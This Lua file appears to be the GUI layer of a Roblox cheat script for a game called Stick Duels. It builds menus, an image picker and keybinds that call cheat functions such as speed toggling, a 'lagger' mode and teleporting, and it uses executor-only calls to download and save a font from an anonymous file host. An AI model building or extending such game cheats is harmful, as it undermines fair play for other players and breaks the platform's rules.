-- MAIN BUILD
function M.applyCustomBackground(frame)
    if not frame then return end
    local existing = frame:FindFirstChild("CustomBgImage")
    if existing then existing:Destroy() end
    -- STICK DUELS: sin imagen de fondo en el menu
    return
end

function M.openImagePicker(kind)
    -- kind = "bg" | "mob"
    local isBg = kind == "bg"
    local ids = isBg and M.BG_IMAGE_IDS or M.MOB_BTN_IMAGE_IDS
    local title = isBg and "CUSTOM BG" or "BUTTON BG"
    local currentId = isBg and (tonumber(M.customBgId) or 0) or (tonumber(M.mobBtnBgId) or 0)
    local opacity = math.clamp(tonumber(M.customBgOpacity) or 0.35, 0, 1)

    local old = player.PlayerGui:FindFirstChild("VynxImagePicker")
    if old then old:Destroy() end
    local cg = game:GetService("CoreGui"):FindFirstChild("VynxImagePicker")
    if cg then cg:Destroy() end

    local gui = Instance.new("ScreenGui")
    gui.Name = "VynxImagePicker"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.DisplayOrder = 120
    pcall(function() gui.Parent = game:GetService("CoreGui") end)
    if not gui.Parent then gui.Parent = player:WaitForChild("PlayerGui") end

    -- dim backdrop (tap to close)
    local dim = Instance.new("TextButton")
    dim.Size = UDim2.fromScale(1, 1)
    dim.BackgroundColor3 = Color3.new(0, 0, 0)
    dim.BackgroundTransparency = 0.45
    dim.Text = ""
    dim.AutoButtonColor = false
    dim.ZIndex = 1
    dim.Parent = gui
    dim.MouseButton1Click:Connect(function() gui:Destroy() end)

    local panel = Instance.new("Frame")
    panel.AnchorPoint = Vector2.new(0.5, 0.5)
    panel.Position = UDim2.new(0.5, 0, 0.5, 0)
    panel.Size = UDim2.new(0, 220, 0, isBg and 280 or 230)
    panel.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
    panel.BorderSizePixel = 0
    panel.ZIndex = 2
    panel.ClipsDescendants = true
    panel.Parent = gui
    Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 14)
    local pst = Instance.new("UIStroke", panel)
    pst.Color = Color3.fromRGB(50, 50, 60)
    pst.Thickness = 1

    local hdr = Instance.new("TextLabel")
    hdr.Size = UDim2.new(1, -40, 0, 28)
    hdr.Position = UDim2.new(0, 12, 0, 6)
    hdr.BackgroundTransparency = 1
    hdr.Text = title
    hdr.TextColor3 = Color3.fromRGB(230, 230, 235)
    hdr.Font = Enum.Font.GothamBold
    hdr.TextSize = 12
    hdr.TextXAlignment = Enum.TextXAlignment.Left
    hdr.ZIndex = 3
    hdr.Parent = panel

    local close = Instance.new("TextButton")
    close.Size = UDim2.new(0, 24, 0, 24)
    close.Position = UDim2.new(1, -30, 0, 6)
    close.BackgroundTransparency = 1
    close.Text = "×"
    close.TextColor3 = Color3.fromRGB(180, 180, 190)
    close.Font = Enum.Font.GothamBold
    close.TextSize = 18
    close.ZIndex = 3
    close.Parent = panel
    close.MouseButton1Click:Connect(function() gui:Destroy() end)

    local preview = Instance.new("ImageLabel")
    preview.Name = "Preview"
    preview.Size = UDim2.new(1, -24, 0, 100)
    preview.Position = UDim2.new(0, 12, 0, 34)
    preview.BackgroundColor3 = Color3.fromRGB(20, 20, 24)
    preview.BorderSizePixel = 0
    preview.ScaleType = Enum.ScaleType.Crop
    preview.Image = currentId > 0 and ("rbxassetid://" .. currentId) or ""
    preview.ImageTransparency = isBg and opacity or 0
    preview.ZIndex = 3
    preview.Parent = panel
    Instance.new("UICorner", preview).CornerRadius = UDim.new(0, 10)

    local scroll = Instance.new("ScrollingFrame")
    scroll.Size = UDim2.new(1, -24, 0, 56)
    scroll.Position = UDim2.new(0, 12, 0, 142)
    scroll.BackgroundTransparency = 1
    scroll.BorderSizePixel = 0
    scroll.ScrollBarThickness = 4
    scroll.ScrollBarImageColor3 = UI_ACCENT or Color3.fromRGB(200, 200, 200)
    scroll.ScrollingDirection = Enum.ScrollingDirection.X
    scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
    scroll.AutomaticCanvasSize = Enum.AutomaticSize.X
    scroll.ZIndex = 3
    scroll.Parent = panel

    local lay = Instance.new("UIListLayout")
    lay.FillDirection = Enum.FillDirection.Horizontal
    lay.Padding = UDim.new(0, 8)
    lay.VerticalAlignment = Enum.VerticalAlignment.Center
    lay.Parent = scroll

    local selectedId = currentId

    local function selectId(id)
        selectedId = id
        preview.Image = id > 0 and ("rbxassetid://" .. id) or ""
        if isBg then
            M.customBgId = id
            if M.mainFrame then M.applyCustomBackground(M.mainFrame) end
        else
            M.mobBtnBgId = id
            if M.mobileButtonsEnabled then M.buildMobileButtons() end
        end
        saveCherryConfig()
    end

    -- None option
    local none = Instance.new("TextButton")
    none.Size = UDim2.new(0, 48, 0, 48)
    none.BackgroundColor3 = Color3.fromRGB(28, 28, 34)
    none.Text = "OFF"
    none.TextColor3 = Color3.fromRGB(200, 200, 210)
    none.Font = Enum.Font.GothamBold
    none.TextSize = 10
    none.ZIndex = 4
    none.Parent = scroll
    Instance.new("UICorner", none).CornerRadius = UDim.new(0, 8)
    none.MouseButton1Click:Connect(function() selectId(0) end)

    for _, id in ipairs(ids) do
        local thumb = Instance.new("ImageButton")
        thumb.Size = UDim2.new(0, 48, 0, 48)
        thumb.BackgroundColor3 = Color3.fromRGB(28, 28, 34)
        thumb.Image = "rbxassetid://" .. tostring(id)
        thumb.ScaleType = Enum.ScaleType.Crop
        thumb.ZIndex = 4
        thumb.Parent = scroll
        Instance.new("UICorner", thumb).CornerRadius = UDim.new(0, 8)
        local st = Instance.new("UIStroke", thumb)
        st.Color = Color3.fromRGB(255, 255, 255)
        st.Transparency = (id == currentId) and 0.2 or 0.7
        st.Thickness = 1
        thumb.MouseButton1Click:Connect(function()
            selectId(id)
            for _, ch in ipairs(scroll:GetChildren()) do
                if ch:IsA("ImageButton") then
                    local s = ch:FindFirstChildOfClass("UIStroke")
                    if s then s.Transparency = 0.7 end
                end
            end
            st.Transparency = 0.2
        end)
    end

    if isBg then
        local opLbl = Instance.new("TextLabel")
        opLbl.Size = UDim2.new(0.5, -12, 0, 18)
        opLbl.Position = UDim2.new(0, 12, 0, 208)
        opLbl.BackgroundTransparency = 1
        opLbl.Text = "OPACITY"
        opLbl.TextColor3 = Color3.fromRGB(160, 160, 170)
        opLbl.Font = Enum.Font.GothamBold
        opLbl.TextSize = 10
        opLbl.TextXAlignment = Enum.TextXAlignment.Left
        opLbl.ZIndex = 3
        opLbl.Parent = panel

        local opVal = Instance.new("TextLabel")
        opVal.Size = UDim2.new(0.5, -12, 0, 18)
        opVal.Position = UDim2.new(0.5, 0, 0, 208)
        opVal.BackgroundTransparency = 1
        opVal.Text = tostring(math.floor((1 - opacity) * 100)) .. "%"
        opVal.TextColor3 = Color3.fromRGB(200, 200, 210)
        opVal.Font = Enum.Font.GothamBold
        opVal.TextSize = 10
        opVal.TextXAlignment = Enum.TextXAlignment.Right
        opVal.ZIndex = 3
        opVal.Parent = panel

        -- simple slider track
        local track = Instance.new("Frame")
        track.Size = UDim2.new(1, -24, 0, 8)
        track.Position = UDim2.new(0, 12, 0, 232)
        track.BackgroundColor3 = Color3.fromRGB(40, 40, 48)
        track.BorderSizePixel = 0
        track.ZIndex = 3
        track.Parent = panel
        Instance.new("UICorner", track).CornerRadius = UDim.new(1, 0)

        local fill = Instance.new("Frame")
        fill.Size = UDim2.new(1 - opacity, 0, 1, 0)
        fill.BackgroundColor3 = Color3.fromRGB(220, 220, 230)
        fill.BorderSizePixel = 0
        fill.ZIndex = 4
        fill.Parent = track
        Instance.new("UICorner", fill).CornerRadius = UDim.new(1, 0)

        local knob = Instance.new("Frame")
        knob.Size = UDim2.new(0, 16, 0, 16)
        knob.AnchorPoint = Vector2.new(0.5, 0.5)
        knob.Position = UDim2.new(1 - opacity, 0, 0.5, 0)
        knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        knob.BorderSizePixel = 0
        knob.ZIndex = 5
        knob.Parent = track
        Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)

        local dragging = false
        local function setFromX(x)
            local rel = math.clamp((x - track.AbsolutePosition.X) / math.max(track.AbsoluteSize.X, 1), 0, 1)
            -- rel 1 = fully opaque image (low ImageTransparency)
            local imageTransparency = 1 - rel
            opacity = imageTransparency
            M.customBgOpacity = opacity
            fill.Size = UDim2.new(rel, 0, 1, 0)
            knob.Position = UDim2.new(rel, 0, 0.5, 0)
            preview.ImageTransparency = opacity
            opVal.Text = tostring(math.floor(rel * 100)) .. "%"
            if M.mainFrame then M.applyCustomBackground(M.mainFrame) end
            saveCherryConfig()
        end
        track.InputBegan:Connect(function(i)
            if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                setFromX(i.Position.X)
            end
        end)
        UIS.InputChanged:Connect(function(i)
            if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
                setFromX(i.Position.X)
            end
        end)
        UIS.InputEnded:Connect(function(i)
            if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
                dragging = false
            end
        end)
    end
end


-- ============================================================
-- CUSTOM FONTS (from EXE)
-- ============================================================
function M._fontShouldTouch(obj)
    if not (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox")) then return false end
    if obj.TextStrokeTransparency ~= 1 then return false end
    return true
end

function M._fontApplyOne(txt)
    if not M._fontShouldTouch(txt) then return end
    if not M._fontOrig[txt] then M._fontOrig[txt] = txt.FontFace end
    if M._fontMy then
        pcall(function() txt.FontFace = M._fontMy end)
    end
end

function M._fontSetupCoding()
    if M._fontMy and M.customFontSelected == "Coding Font" then return true end
    local ok = pcall(function()
        if isfile and writefile and getcustomasset then
            if not isfile("asker_starborn.ttf") then
                writefile("asker_starborn.ttf", game:HttpGet("https://granny.anondrop.net/uploads/6c2505542959f371/Starborn.ttf"))
            end
            writefile("asker_starborn.json", HS:JSONEncode({
                name = "Starborn",
                faces = {{name = "Regular", weight = 400, style = "normal", assetId = getcustomasset("asker_starborn.ttf")}}
            }))
            M._fontMy = Font.new(getcustomasset("asker_starborn.json"))
        end
    end)
    return ok and M._fontMy ~= nil
end

function M.getFontForName(name)
    if not name or name == "None" then return nil end
    if name == "Coding Font" then
        if M._fontSetupCoding() then return M._fontMy end
        return nil
    elseif name == "Summer" then
        return Font.new("rbxasset://fonts/families/PermanentMarker.json")
    elseif name == "Beachy" then
        return Font.new("rbxasset://fonts/families/DenkOne.json")
    elseif name == "Scary" then
        return Font.new("rbxasset://fonts/families/Creepster.json")
    elseif name == "Bangers" then
        return Font.new("rbxasset://fonts/families/Bangers.json")
    end
    return nil
end

function M.applyCustomFont(name)
    if M._fontConn then pcall(function() M._fontConn:Disconnect() end); M._fontConn = nil end
    for obj, orig in pairs(M._fontOrig) do
        pcall(function() if obj and obj.Parent then obj.FontFace = orig end end)
    end
    M._fontOrig = {}
    M.customFontSelected = name or "None"
    if name and name ~= "None" then
        local font = M.getFontForName(name)
        if font then
            M._fontMy = font
            for _, v in ipairs(game:GetDescendants()) do
                M._fontApplyOne(v)
            end
            M._fontConn = game.DescendantAdded:Connect(function(obj)
                if M.customFontSelected ~= "None" then M._fontApplyOne(obj) end
            end)
        end
    else
        M._fontMy = nil
    end
    -- always persist selection
    pcall(function()
        if type(saveCherryConfig) == "function" then saveCherryConfig() end
    end)
end

function M.buildGui()
    applyAccentFromTheme()
    M.clearPersistentConns()

    for _,n in ipairs({"MoveeDuels","Cherry_Menu","K7HubGUI","VantaHubUI","VynxxHubUI","VynxHubUI","AceDuelsAdaptReconstruct"}) do
        local cg=game:GetService("CoreGui")
        local old=cg:FindFirstChild(n); if old then old:Destroy() end
        local pg=player:FindFirstChild("PlayerGui")
        if pg then local o=pg:FindFirstChild(n); if o then o:Destroy() end end
    end

    M.buildStatusUI()

    local gui = Instance.new("ScreenGui")
    gui.Name = "StickDuelsUI"
    gui.ResetOnSpawn = false
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.Parent = player:WaitForChild("PlayerGui")

    local Frame = Instance.new("Frame")
    Frame.Name = "Frame"
    Frame.ClipsDescendants = true
    Frame.Position = UDim2.new(0,22,0.5,-150)
    Frame.Size = UDim2.new(0,420,0,528)
    Frame.BackgroundColor3 = UI_BG_DARK
    Frame.BorderSizePixel = 0
    Frame.Active = true
    Frame.Parent = gui
    M.mainFrame = Frame
    M.applyCustomBackground(Frame)

    local UIScale = Instance.new("UIScale")
    UIScale.Name = "BDUIScale"
    UIScale.Scale = M.uiScale or 0.8
    UIScale.Parent = Frame
    M.uiScaleRef = UIScale

    local frameCorner = Instance.new("UICorner")
    frameCorner.Name = "MainCorner"
    frameCorner.CornerRadius = UDim.new(0, 22)
    frameCorner.Parent = Frame
    do
        local g = Instance.new("UIGradient")
        g.Name = "MainGradient"
        local accent = UI_ACCENT or Color3.fromRGB(255,255,255)
        local bg = UI_BG_DARK or Color3.fromRGB(0,0,0)
        g.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, bg:Lerp(accent, 0.12)),
            ColorSequenceKeypoint.new(0.45, bg),
            ColorSequenceKeypoint.new(1, bg:Lerp(accent, 0.06)),
        })
        g.Rotation = 120
        g.Parent = Frame
        local stroke = Instance.new("UIStroke")
        stroke.Name = "MainStroke"
        stroke.Color = Color3.fromRGB(255, 160, 40)
        stroke.Thickness = 2.2
        stroke.Transparency = 0.25
        stroke.Parent = Frame
        local glowStroke = Instance.new("UIStroke")
        glowStroke.Name = "MainGlow"
        glowStroke.Color = Color3.fromRGB(255, 200, 80)
        glowStroke.Thickness = 5
        glowStroke.Transparency = 0.6
        glowStroke.Parent = Frame
    end

    -- HEADER
    local Header = Instance.new("Frame")
    Header.Size = UDim2.new(1,0,0,68)
    Header.BackgroundTransparency = 1
    Header.Active = true
    Header.Parent = Frame

    do
        local t = Instance.new("TextLabel"); t.ZIndex=3
        local logo = Instance.new("Frame"); logo.ZIndex=3
        logo.Position = UDim2.new(0,18,0,10); logo.Size = UDim2.new(0,48,0,48)
        logo.BackgroundColor3 = Color3.fromRGB(255,140,40)
        logo.BackgroundTransparency = 0.1
        logo.BorderSizePixel = 0
        logo.Parent = Header
        local logoC = Instance.new("UICorner", logo); logoC.CornerRadius = UDim.new(0, 12)
        local logoS = Instance.new("UIStroke", logo)
        logoS.Color = Color3.fromRGB(255, 200, 80)
        logoS.Thickness = 2.5
        logoS.Transparency = 0.1
        local logoTxt = Instance.new("TextLabel", logo)
        logoTxt.Size = UDim2.fromScale(1,1)
        logoTxt.BackgroundTransparency = 1
        logoTxt.Text = "SD"
        logoTxt.TextColor3 = Color3.fromRGB(255,255,255)
        logoTxt.Font = Enum.Font.GothamBlack
        logoTxt.TextSize = 18
        logoTxt.ZIndex = 4

        t.Position = UDim2.new(0,72,0,13); t.Size = UDim2.new(0,320,0,34)
        t.BackgroundTransparency = 1
        t.Text = 'STICK DUELS'
        t.TextColor3 = Color3.fromRGB(255,160,50)
        t.TextSize = 26; t.Font = Enum.Font.GothamBlack
        t.TextXAlignment = Enum.TextXAlignment.Left
        t.RichText = true; t.Parent = Header

        local s = Instance.new("TextLabel"); s.ZIndex=3
        s.Position = UDim2.new(0,74,0,45); s.Size = UDim2.new(0,240,0,13)
        s.BackgroundTransparency = 1
        s.Text = "STICK DUELS"
        s.TextColor3 = Color3.fromRGB(255,180,100)
        s.TextSize = 11; s.Font = Enum.Font.GothamMedium
        s.TextXAlignment = Enum.TextXAlignment.Left; s.Parent = Header
    end

    local MinBtn = Instance.new("TextButton")
    MinBtn.ZIndex=3; MinBtn.Position=UDim2.new(1,-42,0,13); MinBtn.Size=UDim2.new(0,30,0,30)
    MinBtn.BackgroundColor3=UI_BTN_BG; MinBtn.BorderSizePixel=0; MinBtn.Text="-"
    MinBtn.TextColor3=UI_TEXT_PRIMARY; MinBtn.TextSize=13; MinBtn.Font=Enum.Font.GothamBold
    MinBtn.AutoButtonColor=false; MinBtn.Parent=Header
    Instance.new("UICorner",MinBtn).CornerRadius = UDim.new(0,6)
    MinBtn.MouseButton1Down:Connect(function() TweenService:Create(MinBtn, UI_TWEEN_FAST, {BackgroundColor3 = UI_ACCENT}):Play() end)
    MinBtn.MouseButton1Up:Connect(function() TweenService:Create(MinBtn, UI_TWEEN_FAST, {BackgroundColor3 = UI_BTN_BG}):Play() end)

    local lockButton = Instance.new("TextButton")
    lockButton.Size = UDim2.new(0,60,0,24)
    lockButton.Position = UDim2.new(1,-108,0.5,-12)
    lockButton.BackgroundColor3 = UI_BTN_BG
    lockButton.BorderSizePixel = 0
    lockButton.Text = "UNLOCK"
    lockButton.TextColor3 = UI_TEXT_DIM
    lockButton.Font = Enum.Font.GothamBold
    lockButton.TextSize = 9
    lockButton.AutoButtonColor = false
    lockButton.ZIndex = 3
    lockButton.Parent = Header
    Instance.new("UICorner",lockButton).CornerRadius = UDim.new(0,6)

    local locked = M.uiLocked == true
    lockButton.Text = locked and "LOCKED" or "UNLOCK"
    lockButton.TextColor3 = locked and UI_ACCENT or UI_TEXT_DIM
    lockButton.Activated:Connect(function()
        locked = not locked
        M.uiLocked = locked
        lockButton.Text = locked and "LOCKED" or "UNLOCK"
        lockButton.TextColor3 = locked and UI_ACCENT or UI_TEXT_DIM
        if M.applyStatusUILock then M.applyStatusUILock() end
        saveCherryConfig()
    end)

    local Div = Instance.new("Frame")
    Div.Position = UDim2.new(0,16,0,64); Div.Size = UDim2.new(1,-32,0,1)
    Div.BackgroundColor3 = UI_TEXT_WHITE; Div.BorderSizePixel = 0; Div.Parent = Frame
    do local g=Instance.new("UIGradient"); g.Color=ColorSequence.new(UI_ACCENT,UI_ACCENT); g.Transparency=NumberSequence.new(0.2,0.85); g.Parent=Div end

    -- TABS ORIZZONTALI (scrollable when many tabs)
    local TabBar = Instance.new("ScrollingFrame")
    TabBar.Name = "TabBar"
    TabBar.Position = UDim2.new(0,10,0,72)
    TabBar.Size = UDim2.new(1,-20,0,34)
    TabBar.BackgroundTransparency = 1
    TabBar.BorderSizePixel = 0
    TabBar.ScrollBarThickness = 3
    TabBar.ScrollBarImageColor3 = UI_ACCENT
    TabBar.ScrollingDirection = Enum.ScrollingDirection.X
    TabBar.ElasticBehavior = Enum.ElasticBehavior.Always
    TabBar.CanvasSize = UDim2.new(0,0,0,0)
    TabBar.AutomaticCanvasSize = Enum.AutomaticSize.X
    TabBar.Parent = Frame

    local TabsLayout = Instance.new("UIListLayout")
    TabsLayout.FillDirection = Enum.FillDirection.Horizontal
    TabsLayout.Padding = UDim.new(0,6)
    TabsLayout.SortOrder = Enum.SortOrder.LayoutOrder
    TabsLayout.VerticalAlignment = Enum.VerticalAlignment.Center
    TabsLayout.Parent = TabBar

    local TabPad = Instance.new("UIPadding")
    TabPad.PaddingLeft = UDim.new(0,2)
    TabPad.PaddingRight = UDim.new(0,8)
    TabPad.Parent = TabBar

    local TSpeed = uiMakeTab(TabBar,"Tab_SPEED","SPEED",nil,true); TSpeed.LayoutOrder=1
    local TMech  = uiMakeTab(TabBar,"Tab_MECH","DUEL",nil,false); TMech.LayoutOrder=2
    local TVis   = uiMakeTab(TabBar,"Tab_VIS","VISUALS",nil,false); TVis.LayoutOrder=3
    local TUtil  = uiMakeTab(TabBar,"Tab_UTIL","UTILITY",nil,false); TUtil.LayoutOrder=4
    local TKB    = uiMakeTab(TabBar,"Tab_KB","KEYBINDS",nil,false); TKB.LayoutOrder=5

    -- PAGED CONTENT
    local PagedContent = Instance.new("Frame")
    PagedContent.Name = "PagedContent"
    PagedContent.Position = UDim2.new(0,8,0,108)
    PagedContent.Size = UDim2.new(1,-16,1,-120)
    PagedContent.BackgroundTransparency = 1
    PagedContent.Parent = Frame

    -- PAGINE CON SCROLLING FUNZIONANTE
    local PM    = uiMakePage(PagedContent, "Page_SPEED",     1, true)
    local PMech = uiMakePage(PagedContent, "Page_MECHANICS", 2, false)
    local PVis  = uiMakePage(PagedContent, "Page_VISUALS",   3, false)
    local PUtil = uiMakePage(PagedContent, "Page_UTILITY",   4, false)
    local PKB   = uiMakePage(PagedContent, "Page_KEYBINDS",  5, false)

    local Pages = {SPEED=PM, MECHANICS=PMech, VISUALS=PVis, UTILITY=PUtil, KEYBINDS=PKB}
    local Tabs  = {SPEED=TSpeed, MECHANICS=TMech, VISUALS=TVis, UTILITY=TUtil, KEYBINDS=TKB}
    local curTab = "SPEED"

    local function switchTab(name)
        if curTab == name then return end; curTab = name
        for k,p in pairs(Pages) do p.Visible = (k==name) end
        for k,b in pairs(Tabs) do
            local act = (k==name)
            b:SetAttribute("IsActiveTab", act)
            b.BackgroundColor3 = act and UI_ACCENT or Color3.fromRGB(22, 22, 28)
            b.BackgroundTransparency = act and 0.12 or 0.25
            b.TextColor3 = act and Color3.fromRGB(0, 0, 0) or Color3.fromRGB(235,235,245)
            b.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
            b.TextStrokeTransparency = act and 0.15 or 1
            local st = b:FindFirstChild("TabStroke")
            if st then
                st.Color = Color3.fromRGB(255, 255, 255)
                st.Thickness = act and 2 or 1
                st.Transparency = act and 0 or 0.55
            end
        end
    end
    M.selectTab = switchTab

    TSpeed.MouseButton1Click:Connect(function() switchTab("SPEED") end)
    TMech.MouseButton1Click:Connect(function() switchTab("MECHANICS") end)
    TVis.MouseButton1Click:Connect(function() switchTab("VISUALS") end)
    TUtil.MouseButton1Click:Connect(function() switchTab("UTILITY") end)
    TKB.MouseButton1Click:Connect(function() switchTab("KEYBINDS") end)

    -- close / minimize
    local function closeUI()
        local tween = TweenService:Create(Frame, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
            Size = UDim2.new(0, 420, 0, 0),
            Position = Frame.Position + UDim2.new(0, 0, 0, 264),
            BackgroundTransparency = 1
        })
        tween:Play()
        tween.Completed:Connect(function()
            Frame.Visible = false
            Frame.Size = UDim2.new(0, 420, 0, 528)
            Frame.Position = UDim2.new(0, 22, 0.5, -150)
            Frame.BackgroundTransparency = 0
        end)
    end
    local MinPill = Instance.new("Frame")
    MinPill.Visible=false; MinPill.Active=true; MinPill.ZIndex=40
    -- Cuadrado con bordes redondeados, mitad izquierda de la pantalla
    MinPill.AnchorPoint = Vector2.new(0, 0.5)
    MinPill.Position = UDim2.new(0, 12, 0.5, 0)
    MinPill.Size = UDim2.new(0, 72, 0, 72)
    MinPill.BackgroundColor3 = Color3.fromRGB(12, 10, 16)
    MinPill.BackgroundTransparency = 0.05
    MinPill.BorderSizePixel = 0
    MinPill.Parent = gui
    Instance.new("UICorner", MinPill).CornerRadius = UDim.new(0, 16)
    do
        local pst = Instance.new("UIStroke")
        pst.Color = UI_ACCENT or Color3.fromRGB(255, 140, 0)
        pst.Thickness = 2
        pst.Transparency = 0.15
        pst.Parent = MinPill
        -- brillo suave
        local glow = Instance.new("UIStroke")
        glow.Color = UI_ACCENT or Color3.fromRGB(255, 160, 40)
        glow.Thickness = 4
        glow.Transparency = 0.7
        glow.Parent = MinPill
    end
    do
        local l = Instance.new("TextLabel")
        l.Size = UDim2.new(1, -8, 1, -8)
        l.Position = UDim2.new(0, 4, 0, 4)
        l.BackgroundTransparency = 1
        l.Text = "STICK\nDUELS"
        l.TextColor3 = UI_ACCENT or Color3.fromRGB(255, 160, 40)
        l.TextSize = 12
        l.Font = Enum.Font.GothamBlack
        l.TextWrapped = true
        l.TextYAlignment = Enum.TextYAlignment.Center
        l.Parent = MinPill
        local b = Instance.new("TextButton")
        b.ZIndex = 41
        b.Size = UDim2.new(1, 0, 1, 0)
        b.BackgroundTransparency = 1
        b.Text = ""
        b.AutoButtonColor = false
        b.Parent = MinPill
        b.MouseButton1Click:Connect(function()
            MinPill.Visible = false
            Frame.Visible = true
            M.menuOpen = true
            pcall(saveCherryConfig)
        end)
    end

    local function minimize()
        Frame.Visible=false; MinPill.Visible=true

        M.menuOpen=false; pcall(saveCherryConfig)
    end
    MinBtn.MouseButton1Click:Connect(minimize)

    -- DRAGGING
    do
        local function makeDrag(obj, target)
            local drag,dStart,sPos
            obj.InputBegan:Connect(function(i)
                if M.uiLocked then return end
                if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then
                    drag=true; dStart=i.Position; sPos=target.Position
                    i.Changed:Connect(function() if i.UserInputState==Enum.UserInputState.End then drag=false end end)
                end
            end)
            obj.InputChanged:Connect(function(i)
                if i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch then
                    if drag then
                        local d=i.Position-dStart
                        target.Position=UDim2.new(sPos.X.Scale,sPos.X.Offset+d.X,sPos.Y.Scale,sPos.Y.Offset+d.Y)
                    end
                end
            end)
            UIS.InputChanged:Connect(function(i)
                if drag and M.uiLocked then drag=false end
            end)
        end
        makeDrag(Header, Frame)
        makeDrag(MinPill, MinPill)
    end

    -- KEYBIND CAPTURE
    M._anyKeyListening = false
    local activeKBBtn = nil
    M.keybindButtons = M.keybindButtons or {}
    local listeningTimeout = nil

    local function resetKeybindCapture()
        if activeKBBtn then
            for e,b in pairs(M.keybindButtons) do
                if b == activeKBBtn then
                    local parts = {}
                    if e.kb then table.insert(parts, e.kb.Name) end
                    if e.gp then table.insert(parts, e.gp.Name) end
                    b.Text = (#parts > 0) and table.concat(parts, " / ") or "..."
                    b.TextColor3 = UI_TEXT_DIM
                    break
                end
            end
            activeKBBtn = nil
            M._anyKeyListening = false
            if listeningTimeout then task.cancel(listeningTimeout); listeningTimeout = nil end
        end
    end

    local function formatKeybindText(entry)
        if not entry then return "..." end
        local parts = {}
        if entry.kb then table.insert(parts, entry.kb.Name) end
        if entry.gp then table.insert(parts, entry.gp.Name) end
        if #parts == 0 then return "..." end
        return table.concat(parts, " / ")
    end

    local function isGamepadInputType(uit)
        return uit == Enum.UserInputType.Gamepad1
            or uit == Enum.UserInputType.Gamepad2
            or uit == Enum.UserInputType.Gamepad3
            or uit == Enum.UserInputType.Gamepad4
            or uit == Enum.UserInputType.Gamepad5
            or uit == Enum.UserInputType.Gamepad6
            or uit == Enum.UserInputType.Gamepad7
            or uit == Enum.UserInputType.Gamepad8
    end

    local function uiKeybindRow(parent, label, kbEntry)
        local r = Instance.new("Frame"); r.ClipsDescendants = true; r.Size = UDim2.new(1,0,0,44)
        r.BackgroundColor3 = UI_ROW_BG; r.BackgroundTransparency = 0.1; r.BorderSizePixel = 0; r.Parent = parent; uiCardStyle(r)
        local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,13,0,0); l.Size=UDim2.new(0.42,0,0,44); l.BackgroundTransparency=1
        l.Text=label; l.TextColor3=UI_TEXT_PRIMARY; l.TextSize=13; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
        local btn = uiSmallBtn({Parent=r, Pos=UDim2.new(1,-150,0.5,-12), Size=UDim2.new(0,140,0,25),
            Text=formatKeybindText(kbEntry),
            Col=UI_TEXT_DIM, TS=10, CR=6})
        M.keybindButtons[kbEntry] = btn

        btn.MouseButton1Click:Connect(function()
            if activeKBBtn and activeKBBtn ~= btn then resetKeybindCapture() end
            activeKBBtn = btn
            btn.Text = "Press key / button..."
            btn.TextColor3 = Color3.fromRGB(150,150,150)
            M._anyKeyListening = true
            if listeningTimeout then task.cancel(listeningTimeout) end
            listeningTimeout = task.delay(8, resetKeybindCapture)
        end)
        return r
    end

    local function kbMatch(entry, keycode)
        if not entry or not keycode or keycode == Enum.KeyCode.Unknown then return false end
        if entry.kb and entry.kb == keycode then return true end
        if entry.gp and entry.gp == keycode then return true end
        return false
    end

    M._keybindCaptureConn = UIS.InputBegan:Connect(function(input, gameProcessed)
        -- Always capture while rebinding (even if gameProcessed)
        if M._anyKeyListening then
            if activeKBBtn then
                local kc = input.KeyCode
                if kc == Enum.KeyCode.Escape then
                    resetKeybindCapture(); pcall(saveCherryConfig); return
                end
                local uit = input.UserInputType
                if uit == Enum.UserInputType.Keyboard and kc ~= Enum.KeyCode.Unknown then
                    for e,b in pairs(M.keybindButtons) do
                        if b == activeKBBtn then
                            e.kb = kc
                            -- keep existing gamepad bind so both PC + controller work
                            b.Text = formatKeybindText(e)
                            b.TextColor3 = UI_TEXT_DIM
                            activeKBBtn = nil; M._anyKeyListening = false
                            if listeningTimeout then task.cancel(listeningTimeout); listeningTimeout = nil end
                            pcall(saveCherryConfig)
                            break
                        end
                    end
                elseif isGamepadInputType(uit) and kc ~= Enum.KeyCode.Unknown then
                    for e,b in pairs(M.keybindButtons) do
                        if b == activeKBBtn then
                            e.gp = kc
                            -- keep existing keyboard bind
                            b.Text = formatKeybindText(e)
                            b.TextColor3 = UI_TEXT_DIM
                            activeKBBtn = nil; M._anyKeyListening = false
                            if listeningTimeout then task.cancel(listeningTimeout); listeningTimeout = nil end
                            pcall(saveCherryConfig)
                            break
                        end
                    end
                end
            end
            return
        end

        if gameProcessed then return end
        if input.UserInputType ~= Enum.UserInputType.Keyboard and not isGamepadInputType(input.UserInputType) then return end
        local kc = input.KeyCode
        if kc == Enum.KeyCode.Unknown then return end

        if kbMatch(M.KB.LaggerToggle, kc) then
            local now = tick()
            if not M._lastLaggerBindPress or now - M._lastLaggerBindPress > 0.15 then
                M._lastLaggerBindPress = now
                M.cycleLaggerModeBind()
            end
            return
        end
        if kbMatch(M.KB.SpeedToggle, kc) then M.toggleCarryMode(); saveCherryConfig() end
        if kbMatch(M.KB.DropBrainrot, kc) then M.runDrop() end
        if kbMatch(M.KB.TPFloor, kc) then M.runTPFloor() end
        if kbMatch(M.KB.InstaReset, kc) then M.instaReset() end
        if kbMatch(M.KB.AutoLeft, kc) then
            M.autoLeftEnabled = not M.autoLeftEnabled
